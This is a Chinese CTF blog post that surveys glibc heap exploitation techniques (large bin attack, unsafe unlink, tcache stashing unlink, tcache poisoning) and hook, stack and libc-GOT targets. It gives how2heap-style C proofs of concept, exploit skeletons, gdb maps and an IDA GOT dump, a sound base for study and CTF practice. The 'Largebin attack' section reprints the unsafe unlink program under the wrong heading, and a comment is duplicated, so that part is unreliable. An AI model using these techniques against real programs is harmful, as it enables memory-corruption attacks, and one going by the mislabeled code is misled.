---
title: heap-exploation-up-to-2.31
date: 2023-6-21
tags: 
- Pwn 
- CTF 
categories: CTF 
toc: true 
sidebar: none
---


# Basic Knowledge


###### bins:

| unsorted bin  | fast bin  | small bin | large bin |
| ------------- | --------- | --------- | --------- |
| NO LIMITATION | 0x20-0x80 | <0x400    | >0x400    |

## libc version
ubuntu-libc version
- 2.23="16.04"  
- 2.24="17.04" 
- 2.26="17.10"
- 2.27="18.04"  
- 2.28="18.10" 
- 2.29="19.04"
- 2.30="19.10" 
- 2.31="20.04"
- 2.32="20.10"
- 2.33="21.04"
- 2.34="22.04"

# Overview
在刚刚入门堆时，笔者是比较苦恼的，笔者在学习一项知识时，习惯性地想先从大局着手来学习。即，先对这个知识内容的整体有一定了解后，再去填充细节内容。然而在笔者开始学习堆利用时，被各种繁杂的版本差异和堆利用弄得头昏脑涨，因此对于堆一直不得其门而入，无法深刻理解多种多样的技巧及其使用时机，也因此不像栈溢出一样，笔者无法快速理出一个直观的脉络，然后安排细化的学习路径。

本文主要**针对glibc2.30及以上**有着tcache的版本。~~因为低于2.27版本的堆笔者根本不会~~

正如关于栈溢出的文章中，笔者根据攻击点将栈溢出分为三种，在这篇文章中，笔者也将拆解heap exploation，完成笔者心目中的一个划分。

在笔者看来，一次堆利用主要分为一下几个步骤：
- 漏洞的发现
- 地址的泄露
- 利用漏洞控制目标地址内容
- 攻击的对象

因此，本文的主要的编排顺序，也是按照这样几个顺序来实现的。笔者首先将会介绍堆利用过程中的一些基本漏洞，其次，笔者将会介绍如何完成地址泄露，接着，笔者将会讨论一些heap exploation的技术以及这些技术如何控制目标地址，而在可以控制一个目标地址后，最后笔者将讨论如何如何我们可以选取哪些攻击对象，以及他们各自有什么优劣。

笔者写这一篇文章时，去年这个时间差不多是我刚刚开始学习堆利用的时间，经过一年的时间，笔者总算感觉对于堆利用有了一个比较综合性的认知，尽管当前关于heap exploation的blog很多，但是笔者仍然感觉过于零散，因此，在这篇文章中，同笔者关于栈溢出的文章一样，笔者也不会过多的讲述各个技巧的细节--去看这些技巧的提出者大师傅可能讲述地要比我更完善--而着重于贯穿各个技巧的联系， ~~才不是因为笔者懒呢~~ ，目的是提供一个学习路径的图谱和完成一次堆利用时的思考路径。

# 基本漏洞
**UAF**
在free时没有清空指针，可以重利用指针。
在没有`Edit` 的情况下，可以通过 `double free` 进行堆块重叠。

**overflow**
溢出，可以控制下一个chunk，一般而言，可以方便地转换为堆块重叠，因此，也容易利用

**off-by-one**/**off-by-null**
这里主要针对2.29-2.31版本, [2.29-2.31版本的off-by-null](https://www.anquanke.com/post/id/236078#h3-4) ，wjh师傅已经讲解的非常详细了，核心就是通过unsorted bin机制残留的指针伪造fd、bk，来进行unlink，最后制造堆重叠。


**漏洞的利用**
上述几个漏洞都可以方便地转换为堆重叠，在此基础上，可以很方便地转换为任意地址写，在small bin的范围内，可以考虑tcache poison，在large bin的范围内，可以考虑large bin attack，在此基础上再对特定的攻击面进行攻击，即可劫持控制流
考虑:
- one gadget 
- system("/bin/sh") 
- orw 


# leak 
一般而言，堆题中的leak主要是针对libc地址，heap地址的leak相对而言较为简单，而libc地址的leak将在 [[#stack]] 攻击面部分详述。

一般而言，heap leak 堆地址主要利用unsorted bin的第一个chunk会存在libc地址来leak。如果存在UAF，可以将一个直接放入unsorted bin，然后show来获得。

也可以释放入unsorted  bin 后再申请回来实现，由于malloc并不会清空chunk内容，因此可以读取到残留的libc的指针。

而在没有show相关输出chunk内容的函数时，考虑通过`_IO_2_1_stdout_` 来leak 
基本原理就是partial overwrite 覆盖unsorted  bin中的libc地址，分配到__IO_2_1_stdout的位置，然后改写来完成leak 




# Basic tricks up to 2.30
在2.30以上的版本，我认为需要掌握的基本技术主要包括:
- [x] largebin attack 
- [x] tcache stashing unlink attack 
- [x] unsafe unlink 
- [x] tcache poison
- [x] house of botcake  
- [x] decrypt safe_unlink 
- [x] house of pig 
- [x] 堆布局

这里结合how to heap源代码分析

## Largebin attack 

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>

uint64_t *chunk0_ptr;

int main()
{
	setbuf(stdout, NULL);
	printf("Welcome to unsafe unlink 2.0!\n");
	printf("Tested in Ubuntu 20.04 64bit.\n");
	printf("This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n");
	printf("The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n");

	int malloc_size = 0x420; //we want to be big enough not to use tcache or fastbin
	int header_size = 2;

	printf("The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n");

	chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
	uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1
	printf("The global chunk0_ptr is at %p, pointing to %p\n", &chunk0_ptr, chunk0_ptr);
	printf("The victim chunk we are going to corrupt is at %p\n\n", chunk1_ptr);

	printf("We create a fake chunk inside chunk0.\n");
	printf("We setup the size of our fake chunk so that we can bypass the check introduced in https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f\n");
	chunk0_ptr[1] = chunk0_ptr[-1] - 0x10;
	printf("We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.\n");
	chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
	printf("We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.\n");
	printf("With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False\n");
	chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
	printf("Fake chunk fd: %p\n",(void*) chunk0_ptr[2]);
	printf("Fake chunk bk: %p\n\n",(void*) chunk0_ptr[3]);

	printf("We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n");
	uint64_t *chunk1_hdr = chunk1_ptr - header_size;
	printf("We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n");
	printf("It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n");
	chunk1_hdr[0] = malloc_size;
	printf("If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x430, however this is its new value: %p\n",(void*)chunk1_hdr[0]);
	printf("We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n");
	chunk1_hdr[1] &= ~1;

	printf("Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n");
	printf("You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n");
	free(chunk1_ptr);

	printf("At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n");
	char victim_string[8];
	strcpy(victim_string,"Hello!~");
	chunk0_ptr[3] = (uint64_t) victim_string;

	printf("chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n");
	printf("Original value: %s\n",victim_string);
	chunk0_ptr[0] = 0x4141414142424242LL;
	printf("New Value: %s\n",victim_string);

	// sanity check
	assert(*(long *)victim_string == 0x4141414142424242L);
}
```



**核心思路:**
```python
malloc(0x420) # chunk A
malloc(0x18)
#And another chunk to prevent consolidate
malloc(0x410) # chunk B
#This chunk should be smaller than [p1] and belong to the same large bin
malloc(0x18)
#And another chunk to prevent consolidate
free(0)
malloc(0x438)
#Allocate a chunk larger than [p1] to insert [p1] into large bin
free(1)
#Free the smaller of the two --> [p2]
edit(0, p64(0)*3+p64(target2-0x20))
#最终addr1与addr2地址中的值均被赋成了victim即chunk_B的chunk header地址最终addr1与addr2地址中的值均被赋成了victim即chunk_B的chunk header地址
malloc(0x438)
edit(0, p64(recover)*2) # 修复large bin attack 
```

**修复:**
可以通过gdb查看未更改时chunk A的fd和bk，然后修复，免于计算 

**限制:**
- 需要一次UAF 

**效果:**
- 在2.30以上可以在任意地址写入一个libc地址

## unsafe unlink 
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>

uint64_t *chunk0_ptr;

int main()
{
	setbuf(stdout, NULL);
	printf("Welcome to unsafe unlink 2.0!\n");
	printf("Tested in Ubuntu 20.04 64bit.\n");
	printf("This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n");
	printf("The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n");

	int malloc_size = 0x420; //we want to be big enough not to use tcache or fastbin
	int header_size = 2;

	printf("The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n");

	chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
	uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1
	printf("The global chunk0_ptr is at %p, pointing to %p\n", &chunk0_ptr, chunk0_ptr);
	printf("The victim chunk we are going to corrupt is at %p\n\n", chunk1_ptr);

	printf("We create a fake chunk inside chunk0.\n");
	printf("We setup the size of our fake chunk so that we can bypass the check introduced in https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f\n");
	chunk0_ptr[1] = chunk0_ptr[-1] - 0x10;
	printf("We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.\n");
	chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
	printf("We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.\n");
	printf("With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False\n");
	chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
	printf("Fake chunk fd: %p\n",(void*) chunk0_ptr[2]);
	printf("Fake chunk bk: %p\n\n",(void*) chunk0_ptr[3]);

	printf("We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n");
	uint64_t *chunk1_hdr = chunk1_ptr - header_size;
	printf("We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n");
	printf("It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n");
	chunk1_hdr[0] = malloc_size;
	printf("If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x430, however this is its new value: %p\n",(void*)chunk1_hdr[0]);
	printf("We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n");
	chunk1_hdr[1] &= ~1;

	printf("Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n");
	printf("You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n");
	free(chunk1_ptr);

	printf("At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n");
	char victim_string[8];
	strcpy(victim_string,"Hello!~");
	chunk0_ptr[3] = (uint64_t) victim_string;

	printf("chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n");
	printf("Original value: %s\n",victim_string);
	chunk0_ptr[0] = 0x4141414142424242LL;
	printf("New Value: %s\n",victim_string);

	// sanity check
	assert(*(long *)victim_string == 0x4141414142424242L);
}
```

**核心思路:**
```python
# chunk 0 ptr store in &ptr

malloc(0x420) # not in fastbin or tcache
malloc(0x420) 
edit(0, p64(0)+p64(fake_size)+p64(&ptr-0x18)+p64(&ptr-0x10)+p64(0)*k + p64(fake_prev_size)+p64(size)) # fakesize = 0x420-0x10
# need fake_prev_size = prev_size-0x10, sive.PREV_INUSE = 0
```

**限制:**
- overflow ,可以修改prev_inuse触发fake chunk  unlink and  consolidate 
- 主要适用于可以知道堆指针存储基址的情况，可以控制堆管理机构

**效果:**
- 可以将ptr处地址改写为&ptr-8



##  tcache stashing unlink 

```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main(){
    unsigned long stack_var[0x10] = {0};
    unsigned long *chunk_lis[0x10] = {0};
    unsigned long *target;

    setbuf(stdout, NULL);

    printf("This file demonstrates the stashing unlink attack on tcache.\n\n");
    printf("This poc has been tested on both glibc-2.27, glibc-2.29 and glibc-2.31.\n\n");
    printf("This technique can be used when you are able to overwrite the victim->bk pointer. Besides, it's necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n");
    printf("The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n");
    printf("This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we'll create the chunk on the stack.\n\n");

    // stack_var emulate the fake_chunk we want to alloc to
    printf("Stack_var emulates the fake chunk we want to alloc to.\n\n");
    printf("First let's write a writeable address to fake_chunk->bk to bypass bck->fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk->bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n");

    stack_var[3] = (unsigned long)(&stack_var[2]);

    printf("You can see the value of fake_chunk->bk is:%p\n\n",(void*)stack_var[3]);
    printf("Also, let's see the initial value of stack_var[4]:%p\n\n",(void*)stack_var[4]);
    printf("Now we alloc 9 chunks with malloc.\n\n");

    //now we malloc 9 chunks
    for(int i = 0;i < 9;i++){
        chunk_lis[i] = (unsigned long*)malloc(0x90);
    }

    //put 7 chunks into tcache
    printf("Then we free 7 of them in order to put them into tcache. Carefully we didn't free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n");

    for(int i = 3;i < 9;i++){
        free(chunk_lis[i]);
    }

    printf("As you can see, chunk1 & [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n");

    //last tcache bin
    free(chunk_lis[1]);
    //now they are put into unsorted bin
    free(chunk_lis[0]);
    free(chunk_lis[2]);

    //convert into small bin
    printf("Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n");

    malloc(0xa0);// size > 0x90

    //now 5 tcache bins
    printf("Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n");

    malloc(0x90);
    malloc(0x90);

    printf("Now we emulate a vulnerability that can overwrite the victim->bk pointer into fake_chunk addr: %p.\n\n",(void*)stack_var);

    //change victim->bck
    /*VULNERABILITY*/
    chunk_lis[2][1] = (unsigned long)stack_var;
    /*VULNERABILITY*/

    //trigger the attack
    printf("Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n");

    calloc(1,0x90);

    printf("Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck->fd has been changed into a libc addr: %p\n\n",(void*)stack_var[2],(void*)stack_var[4]);

    //malloc and return our fake chunk on stack
    target = malloc(0x90);   

    printf("As you can see, next malloc(0x90) will return the region our fake chunk: %p\n",(void*)target);

    assert(target == &stack_var[2]);
    return 0;
}

```


**核心思路:**
```python
calloc(0xa0)
for i in range(6):
    calloc(0xa0)
    free(i)
calloc(0x4b0) # 9 
calloc(0xb0) # 10
free(9)
calloc(0x400)

calloc(0x4b0) # 11
calloc(0xb0) # 12
free(9)
calloc(0x400) #13
edit(13, b'\x00'*0x400+p64(prev_size)+p64(size)+p64(target_add-0x10))
calloc(0xa0)
```


**限制:**
- 需要UAF
- 主要适用于只有calloc并且可以分配tcache大小的chunk的情况，对于有malloc，打tcache poison更加方便

**效果:**
- 获得任意地址target_addr的控制权：在上述流程中，直接将chunk_A的bk改为target_addr - 0x10，并且保证target_addr - 0x10的bk的fd为一个可写地址（一般情况下，使target_addr - 0x10的bk，即target_addr + 8处的值为一个可写地址即可）。
- 在任意地址target_addr写入大数值：在unsorted bin attack后，有时候要修复链表，在链表不好修复时，可以采用此利用达到同样的效果，在高版本glibc下，unsorted bin attack失效后，此利用应用更为广泛。在上述流程中，需要使tcache bin中原先有六个堆块，然后将chunk_A的bk改为target_addr - 0x10即可。  



## tcache poison 
主要是通过改写tcache的next指针，实现类似于fastbin的house of spirit的效果。

## house of origin
house of origin 原利用链中的IO_FILE相关利用已经失效了，这里主要关注其绕过无free函数限制的方法，即通过malloc大于top chunk大小的chunk时会先释放top chunk，再拓展堆区域。

一般而言，修改top chunk需要满足一下条件。

1. 伪造的 size 必须要对齐到内存页
2. size 要大于 MINSIZE(0x10)
3. size 要小于之后申请的 chunk size + MINSIZE(0x10)
4. size 的 prev inuse 位必须为 1


# 攻击面
- 劫持控制流
	- hooks 
	- stack 
	- IO_FILE 
	- dlts
	- libc.got
- 辅助攻击链
	- tcache_perthread_struct 
	- global_max_fast 
	- heap 管理结构


## 劫持控制流
### hooks
堆利用中最基本的夺取控制流的方法就是打各种hooks。
一般而言，可以利用__free_hook 加 写入'/bin/sh'的堆快实现劫持。

此外，如果要打one_gadget的话，可以打__malloc_hook，在tcache之前的版本，更多是打__malloc_hook，因为其在main_arena附近，存在许多libc上地址，方便通过错位构造0x7f的size，此外，由于__malloc_hook和__realloc_hook临近，也可以很方便地同时控制这两个hook，然后通过__realloc_hook配合来调整栈帧，方便满足one gadget 条件

而在glibc2.34版本及以上，各类hooks都已经被移除，因此也需要掌握一些其他的劫持控制流的办法。

### stack 
在stack overflow 中，通过栈和ROP劫持控制流的方法我们已经不陌生，然而不像stack overflow 天然可以在栈上写入，如果要在heap exploation中通过ROP来劫持控制流，一个无法绕过的问题是栈地址不可知。

我们都知道程序加载时，环境变量会被压入栈中，可以通过environ指针访问到栈上环境变量。

查看glibc源代码
```c
#if !_LIBC
# define __environ	environ
# ifndef HAVE_ENVIRON_DECL
extern char **environ;
# endif
#endif
```
发现这是一个extern变量，在gdb中调试查找

```c
    0x7f78a14d4000     0x7f78a1500000 r--p    2c000      0 /home/nemo/Pwn/workspace/write-ups/MetaCtf.2021/pwn/Hookless/libc.so.6
    0x7f78a1500000     0x7f78a1668000 r-xp   168000  2c000 /home/nemo/Pwn/workspace/write-ups/MetaCtf.2021/pwn/Hookless/libc.so.6
    0x7f78a1668000     0x7f78a16bd000 r--p    55000 194000 /home/nemo/Pwn/workspace/write-ups/MetaCtf.2021/pwn/Hookless/libc.so.6
    0x7f78a16bd000     0x7f78a16be000 ---p     1000 1e9000 /home/nemo/Pwn/workspace/write-ups/MetaCtf.2021/pwn/Hookless/libc.so.6
    0x7f78a16be000     0x7f78a16c1000 r--p     3000 1e9000 /home/nemo/Pwn/workspace/write-ups/MetaCtf.2021/pwn/Hookless/libc.so.6
    0x7f78a16c1000     0x7f78a16c4000 rw-p     3000 1ec000 /home/nemo/Pwn/workspace/write-ups/MetaCtf.2021/pwn/Hookless/libc.so.6
    0x7f78a16c4000     0x7f78a16d3000 rw-p     f000      0 [anon_7f78a16c4]
    0x7f78a16d3000     0x7f78a16d4000 r--p     1000      0 /home/nemo/Pwn/workspace/write-ups/MetaCtf.2021/pwn/Hookless/ld.so.2
    0x7f78a16d4000     0x7f78a16f8000 r-xp    24000   1000 /home/nemo/Pwn/workspace/write-ups/MetaCtf.2021/pwn/Hookless/ld.so.2
    0x7f78a16f8000     0x7f78a1702000 r--p     a000  25000 /home/nemo/Pwn/workspace/write-ups/MetaCtf.2021/pwn/Hookless/ld.so.2
    0x7f78a1702000     0x7f78a1704000 r--p     2000  2e000 /home/nemo/Pwn/workspace/write-ups/MetaCtf.2021/pwn/Hookless/ld.so.2
    0x7f78a1704000     0x7f78a1706000 rw-p     2000  30000 /home/nemo/Pwn/workspace/write-ups/MetaCtf.2021/pwn/Hookless/ld.so.2
    0x7ffd6bb9e000     0x7ffd6bbc0000 rw-p    22000      0 [stack]
    0x7ffd6bbd4000     0x7ffd6bbd8000 r--p     4000      0 [vvar]
    0x7ffd6bbd8000     0x7ffd6bbda000 r-xp     2000      0 [vdso]
0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]
pwndbg> p environ
$1 = (char **) 0x7ffd6bbbdfc8
pwndbg> p &environ
$2 = (char ***) 0x7f78a16c9ec0 <environ>
pwndbg> 

```

可以看到其存在于anon_7f78a16c4段，在libc后，与libc存在固定偏移，猜测这一部分内容与ld 过程有关（笔者暂且还没有查证）

既然可以通过访问libc偏移地址leak stack地址，那么此时我们就可以通过这个栈地址分配到栈上来ROP了。

此攻击点的优点是不像IO_FILE的攻击那样，需要触发程序结束时（exit()函数，从main返回，malloc_assert）时清理现场的流程，可以覆盖堆菜单中分配函数或者edit函数的栈来实现攻击。

### libc.got 

checksec libc，会发现其一般开启了Partial RELRO，所以可以考虑写libc的got表

```bash
$ checksec libc.so.6       
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

```

笔者在实际操作时发现，pwntools的elf.got并不能很好解析libc的got段，可以使用IDA来查看。

以下的got表来自libc2.34

```c
.got.plt:00000000001ED000 ; Segment type: Pure data
.got.plt:00000000001ED000 ; Segment permissions: Read/Write
.got.plt:00000000001ED000 _got_plt        segment qword public 'DATA' use64
.got.plt:00000000001ED000                 assume cs:_got_plt
.got.plt:00000000001ED000                 ;org 1ED000h
.got.plt:00000000001ED000 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC
.got.plt:00000000001ED008 qword_1ED008    dq 0                    ; DATA XREF: sub_2C000↑r
.got.plt:00000000001ED010 qword_1ED010    dq 0                    ; DATA XREF: sub_2C000+6↑r
.got.plt:00000000001ED018 off_1ED018      dq offset __strnlen_ifunc
.got.plt:00000000001ED018                                         ; DATA XREF: j___strnlen_ifunc↑r
.got.plt:00000000001ED018                                         ; Indirect relocation
.got.plt:00000000001ED020 off_1ED020      dq offset __rawmemchr_ifunc
.got.plt:00000000001ED020                                         ; DATA XREF: j___rawmemchr_ifunc↑r
.got.plt:00000000001ED020                                         ; Indirect relocation
.got.plt:00000000001ED028 off_1ED028      dq offset __GI___libc_realloc
.got.plt:00000000001ED028                                         ; DATA XREF: _realloc↑r
.got.plt:00000000001ED030 off_1ED030      dq offset __strncasecmp_ifunc
.got.plt:00000000001ED030                                         ; DATA XREF: j___strncasecmp_ifunc↑r
.got.plt:00000000001ED030                                         ; Indirect relocation
.got.plt:00000000001ED038 off_1ED038      dq offset _dl_exception_create
.got.plt:00000000001ED038                                         ; DATA XREF: __dl_exception_create↑r
.got.plt:00000000001ED040 off_1ED040      dq offset __mempcpy_ifunc
.got.plt:00000000001ED040                                         ; DATA XREF: j___mempcpy_ifunc↑r
.got.plt:00000000001ED040                                         ; Indirect relocation
.got.plt:00000000001ED048 off_1ED048      dq offset __wmemset_ifunc
.got.plt:00000000001ED048                                         ; DATA XREF: j___wmemset_ifunc↑r
.got.plt:00000000001ED048                                         ; Indirect relocation
.got.plt:00000000001ED050 off_1ED050      dq offset __libc_calloc ; DATA XREF: _calloc↑r
.got.plt:00000000001ED058 off_1ED058      dq offset strspn_ifunc  ; DATA XREF: j_strspn_ifunc↑r
.got.plt:00000000001ED058                                         ; Indirect relocation
.got.plt:00000000001ED060 off_1ED060      dq offset memchr_ifunc  ; DATA XREF: j_memchr_ifunc↑r
.got.plt:00000000001ED060                                         ; Indirect relocation
.got.plt:00000000001ED068 off_1ED068      dq offset __libc_memmove_ifunc
.got.plt:00000000001ED068                                         ; DATA XREF: j___libc_memmove_ifunc↑r
.got.plt:00000000001ED068                                         ; Indirect relocation
.got.plt:00000000001ED070 off_1ED070      dq offset __wmemchr_ifunc
.got.plt:00000000001ED070                                         ; DATA XREF: j___wmemchr_ifunc↑r
.got.plt:00000000001ED070                                         ; Indirect relocation
.got.plt:00000000001ED078 off_1ED078      dq offset __stpcpy_ifunc
.got.plt:00000000001ED078                                         ; DATA XREF: j___stpcpy_ifunc↑r
.got.plt:00000000001ED078                                         ; Indirect relocation
.got.plt:00000000001ED080 off_1ED080      dq offset __wmemcmp_ifunc
.got.plt:00000000001ED080                                         ; DATA XREF: j___wmemcmp_ifunc↑r
.got.plt:00000000001ED080                                         ; Indirect relocation
.got.plt:00000000001ED088 off_1ED088      dq offset _dl_find_dso_for_object
.got.plt:00000000001ED088                                         ; DATA XREF: __dl_find_dso_for_object↑r
.got.plt:00000000001ED090 off_1ED090      dq offset strncpy_ifunc ; DATA XREF: j_strncpy_ifunc↑r
.got.plt:00000000001ED090                                         ; Indirect relocation
.got.plt:00000000001ED098 off_1ED098      dq offset strlen_ifunc  ; DATA XREF: j_strlen_ifunc↑r
.got.plt:00000000001ED098                                         ; Indirect relocation
.got.plt:00000000001ED0A0 off_1ED0A0      dq offset __strcasecmp_l_ifunc
.got.plt:00000000001ED0A0                                         ; DATA XREF: j___strcasecmp_l_ifunc↑r
.got.plt:00000000001ED0A0                                         ; Indirect relocation
.got.plt:00000000001ED0A8 off_1ED0A8      dq offset strcpy_ifunc  ; DATA XREF: j_strcpy_ifunc↑r
.got.plt:00000000001ED0A8                                         ; Indirect relocation
.got.plt:00000000001ED0B0 off_1ED0B0      dq offset __wcschr_ifunc
.got.plt:00000000001ED0B0                                         ; DATA XREF: j___wcschr_ifunc↑r
.got.plt:00000000001ED0B0                                         ; Indirect relocation
.got.plt:00000000001ED0B8 off_1ED0B8      dq offset __strchrnul_ifunc
.got.plt:00000000001ED0B8                                         ; DATA XREF: j___strchrnul_ifunc↑r
.got.plt:00000000001ED0B8                                         ; Indirect relocation
.got.plt:00000000001ED0C0 off_1ED0C0      dq offset __memrchr_ifunc
.got.plt:00000000001ED0C0                                         ; DATA XREF: j___memrchr_ifunc↑r
.got.plt:00000000001ED0C0                                         ; Indirect relocation
.got.plt:00000000001ED0C8 off_1ED0C8      dq offset _dl_deallocate_tls
.got.plt:00000000001ED0C8                                         ; DATA XREF: __dl_deallocate_tls↑r
.got.plt:00000000001ED0D0 off_1ED0D0      dq offset __tls_get_addr
.got.plt:00000000001ED0D0                                         ; DATA XREF: ___tls_get_addr↑r
.got.plt:00000000001ED0D8 off_1ED0D8      dq offset __wmemset_ifunc
.got.plt:00000000001ED0D8                                         ; DATA XREF: j___wmemset_ifunc_0↑r
.got.plt:00000000001ED0D8                                         ; Indirect relocation
.got.plt:00000000001ED0E0 off_1ED0E0      dq offset memcmp_ifunc  ; DATA XREF: j_memcmp_ifunc↑r
.got.plt:00000000001ED0E0                                         ; Indirect relocation
.got.plt:00000000001ED0E8 off_1ED0E8      dq offset __strncasecmp_l_ifunc
.got.plt:00000000001ED0E8                                         ; DATA XREF: j___strncasecmp_l_ifunc↑r
.got.plt:00000000001ED0E8                                         ; Indirect relocation
.got.plt:00000000001ED0F0 off_1ED0F0      dq offset _dl_fatal_printf
.got.plt:00000000001ED0F0                                         ; DATA XREF: __dl_fatal_printf↑r
.got.plt:00000000001ED0F8 off_1ED0F8      dq offset strcat_ifunc  ; DATA XREF: j_strcat_ifunc↑r
.got.plt:00000000001ED0F8                                         ; Indirect relocation
.got.plt:00000000001ED100 off_1ED100      dq offset __wcscpy_ifunc
.got.plt:00000000001ED100                                         ; DATA XREF: j___wcscpy_ifunc↑r
.got.plt:00000000001ED100                                         ; Indirect relocation
.got.plt:00000000001ED108 off_1ED108      dq offset strcspn_ifunc ; DATA XREF: j_strcspn_ifunc↑r
.got.plt:00000000001ED108                                         ; Indirect relocation
.got.plt:00000000001ED110 off_1ED110      dq offset __strcasecmp_ifunc
.got.plt:00000000001ED110                                         ; DATA XREF: j___strcasecmp_ifunc↑r
.got.plt:00000000001ED110                                         ; Indirect relocation
.got.plt:00000000001ED118 off_1ED118      dq offset strncmp_ifunc ; DATA XREF: j_strncmp_ifunc↑r
.got.plt:00000000001ED118                                         ; Indirect relocation
.got.plt:00000000001ED120 off_1ED120      dq offset __wmemchr_ifunc
.got.plt:00000000001ED120                                         ; DATA XREF: j___wmemchr_ifunc_0↑r
.got.plt:00000000001ED120                                         ; Indirect relocation
.got.plt:00000000001ED128 off_1ED128      dq offset __stpncpy_ifunc
.got.plt:00000000001ED128                                         ; DATA XREF: j___stpncpy_ifunc↑r
.got.plt:00000000001ED128                                         ; Indirect relocation
.got.plt:00000000001ED130 off_1ED130      dq offset __wcscmp_ifunc
.got.plt:00000000001ED130                                         ; DATA XREF: j___wcscmp_ifunc↑r
.got.plt:00000000001ED130                                         ; Indirect relocation
.got.plt:00000000001ED138 off_1ED138      dq offset __libc_memmove_ifunc
.got.plt:00000000001ED138                                         ; DATA XREF: j___libc_memmove_ifunc_0↑r
.got.plt:00000000001ED138                                         ; Indirect relocation
.got.plt:00000000001ED140 off_1ED140      dq offset strrchr_ifunc ; DATA XREF: j_strrchr_ifunc↑r
.got.plt:00000000001ED140                                         ; Indirect relocation
.got.plt:00000000001ED148 off_1ED148      dq offset strchr_ifunc  ; DATA XREF: j_strchr_ifunc↑r
.got.plt:00000000001ED148                                         ; Indirect relocation
.got.plt:00000000001ED150 off_1ED150      dq offset __wcschr_ifunc
.got.plt:00000000001ED150                                         ; DATA XREF: j___wcschr_ifunc_0↑r
.got.plt:00000000001ED150                                         ; Indirect relocation
.got.plt:00000000001ED158 off_1ED158      dq offset __new_memcpy_ifunc
.got.plt:00000000001ED158                                         ; DATA XREF: j___new_memcpy_ifunc↑r
.got.plt:00000000001ED158                                         ; Indirect relocation
.got.plt:00000000001ED160 off_1ED160      dq offset _dl_rtld_di_serinfo
.got.plt:00000000001ED160                                         ; DATA XREF: __dl_rtld_di_serinfo↑r
.got.plt:00000000001ED168 off_1ED168      dq offset _dl_allocate_tls
.got.plt:00000000001ED168                                         ; DATA XREF: __dl_allocate_tls↑r
.got.plt:00000000001ED170 off_1ED170      dq offset __tunable_get_val
.got.plt:00000000001ED170                                         ; DATA XREF: ___tunable_get_val↑r
